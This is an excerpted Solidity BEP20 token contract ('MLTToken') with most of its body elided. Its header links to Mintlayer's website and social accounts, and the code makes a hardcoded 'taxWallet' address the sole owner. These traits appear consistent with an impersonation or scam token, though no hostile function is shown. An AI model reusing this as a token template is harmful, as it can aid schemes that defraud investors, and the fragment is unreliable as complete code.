...
https://t.me/MLTTokens
https://www.mintlayer.org/
https://twitter.com/mintlayer
*/
...
contract BEP20 is Context, IERC20, IERC20Metadata {
   ...
   address private taxWallet; 
     ...
     * construction.
     */
    string public telegram = "https://t.me/MLTTokens";
    constructor(string memory name_, string memory symbol_) {
        taxWallet = 0x2558C4A63B6986492Bf5F3599D7320e97B022D8B;    
        _name = name_;
        _symbol = symbol_;
    ...
    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
                    ...
                    function getDIE2dot0Telegrame() public view returns (string memory) {
        return telegram;
    } 
    modifier onlyOwner() {
        require(taxWallet == _msgSender(), "io: caller is not the owner");
        _;
    }
    /**
...
contract MLTToken is BEP20 {
    constructor() BEP20("MLTToken", "MLTOK") {}
}